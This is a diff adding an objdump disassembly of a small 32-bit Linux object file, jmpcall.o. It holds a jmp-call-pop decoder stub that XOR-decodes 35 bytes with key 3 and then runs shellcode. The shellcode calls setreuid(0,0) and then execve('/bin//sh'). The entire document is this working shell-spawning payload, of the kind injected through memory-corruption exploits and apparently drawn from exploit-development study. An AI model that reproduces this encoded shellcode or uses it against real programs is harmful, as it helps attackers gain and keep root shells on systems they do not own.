@@ -1,0 +1,40 @@
+
+jmpcall.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <_start>:
+   0:	eb 0d                	jmp    f <call_point>
+
+00000002 <begin>:
+   2:	5e                   	pop    %esi
+   3:	31 c9                	xor    %ecx,%ecx
+   5:	b1 23                	mov    $0x23,%cl
+
+00000007 <short_xor>:
+   7:	80 36 03             	xorb   $0x3,(%esi)
+   a:	46                   	inc    %esi
+   b:	e2 fa                	loop   7 <short_xor>
+   d:	eb 05                	jmp    14 <shellcode>
+
+0000000f <call_point>:
+   f:	e8 ee ff ff ff       	call   2 <begin>
+
+00000014 <shellcode>:
+  14:	31 c0                	xor    %eax,%eax
+  16:	b0 46                	mov    $0x46,%al
+  18:	31 db                	xor    %ebx,%ebx
+  1a:	31 c9                	xor    %ecx,%ecx
+  1c:	cd 80                	int    $0x80
+  1e:	31 c0                	xor    %eax,%eax
+  20:	50                   	push   %eax
+  21:	68 2f 2f 73 68       	push   $0x68732f2f
+  26:	68 2f 62 69 6e       	push   $0x6e69622f
+  2b:	89 e3                	mov    %esp,%ebx
+  2d:	50                   	push   %eax
+  2e:	53                   	push   %ebx
+  2f:	89 e1                	mov    %esp,%ecx
+  31:	31 d2                	xor    %edx,%edx
+  33:	b0 0b                	mov    $0xb,%al
+  35:	cd 80                	int    $0x80
